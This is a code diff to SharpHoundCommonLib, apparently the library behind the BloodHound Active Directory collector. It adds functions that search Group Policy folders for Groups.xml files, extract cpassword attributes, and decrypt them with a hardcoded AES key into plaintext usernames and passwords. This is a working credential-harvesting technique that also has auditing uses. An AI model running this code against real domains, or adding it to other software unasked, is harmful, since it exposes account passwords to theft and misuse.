@@ -1,11 +1,15 @@
 ﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.DirectoryServices.Protocols;
 using System.IO;
 using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
+using System.Xml;
 using System.Xml.XPath;
 using Microsoft.Extensions.Logging;
 using SharpHoundCommonLib.Enums;
@@ -197,6 +201,11 @@ namespace SharpHoundCommonLib.Processors
                         GpoActionCache.TryAdd(linkDn, actions);
                         continue;
                     }
+
+                    //////////////////
+                    // Add potentially found passwords in XML files
+                    var passwds = ProcessXmlFiles(filePath);
+                    ret.passwords = passwds;
 
                     //Add the actions for each file. The GPO template file actions will override the XML file actions
                     actions.AddRange(ProcessGPOXmlFile(filePath, gpoDomain).ToList());
@@ -732,6 +741,44 @@ namespace SharpHoundCommonLib.Processors
             };
         }
 
+        //////////
+        // Inspired from PingCastle https://github.com/vletoux/pingcastle/tree/master
+        internal List<Dictionary<string, string>> ProcessXmlFiles(string basePath)
+        {
+            List<Dictionary<string, string>> passwords = new List<Dictionary<string, string>>();
+            XmlDocument doc = new XmlDocument();
+
+            var directories = Directory.GetDirectories(basePath+"\\..");
+            foreach (var directory in directories)
+            {
+                string fullname = Path.Combine(basePath, "..", directory, "MACHINE", "Preferences", "Groups", "Groups.xml");
+                if (File.Exists(fullname))
+                {
+                    doc.Load(fullname);
+                    XmlNodeList nodeList = doc.SelectNodes("/Groups/User");
+                    foreach(XmlNode node in nodeList)
+                    {
+                        XmlNode passwordNode = node.SelectSingleNode("Properties/@cpassword");
+
+                        if(passwordNode == null || String.IsNullOrEmpty(passwordNode.Value))
+                        {
+                            continue;
+                        }
+                        string password = passwordNode.Value;
+                        string username = node.SelectSingleNode("Properties/@userName") != null ? node.SelectSingleNode("Properties/@userName").Value : string.Empty;
+                        Dictionary<string, string> toInsert = new Dictionary<string, string>()
+                        {
+                            {"username", username},
+                            {"password", DecodeGPPPassword(password)}
+                        };
+                        passwords.Add(toInsert);
+                    }
+                }
+            }
+
+            return passwords;
+        }
+
         /// <summary>
         ///     Parses a GPO Groups.xml file and pulls group membership changes out
         /// </summary>
@@ -888,6 +935,51 @@ namespace SharpHoundCommonLib.Processors
                     }
                 }
             }
+        }
+        ///////////
+        private string DecodeGPPPassword(string encryptedPassword)
+        {
+            byte[] aesKey = {0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b};
+            string decrypted = null;
+            switch (encryptedPassword.Length % 4)
+            {
+                case 2:
+                    encryptedPassword += "==";
+                    break;
+                case 3:
+                    encryptedPassword += "=";
+                    break;
+            }
+            byte[] buffer = Convert.FromBase64String(encryptedPassword);
+            try
+            {
+                using (Rijndael aes = new RijndaelManaged())
+                {
+                    aes.Key = aesKey;
+                    aes.IV = new byte[aes.IV.Length];
+                    var transform = aes.CreateDecryptor();
+                    using (var ms = new System.IO.MemoryStream())
+                    {
+                        using (var cs = new CryptoStream(ms, transform, CryptoStreamMode.Write))
+                        {
+                            cs.Write(buffer, 0, buffer.Length);
+                            cs.FlushFinalBlock();
+                            decrypted = Encoding.Unicode.GetString(ms.ToArray());
+                            cs.Close();
+                            ms.Close();
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Trace.WriteLine("Unable to decrypt " + encryptedPassword);
+                Trace.WriteLine(ex.Message);
+                Trace.WriteLine(ex.StackTrace);
+                return encryptedPassword;
+            }
+            return decrypted;
         }
 
         /// <summary>
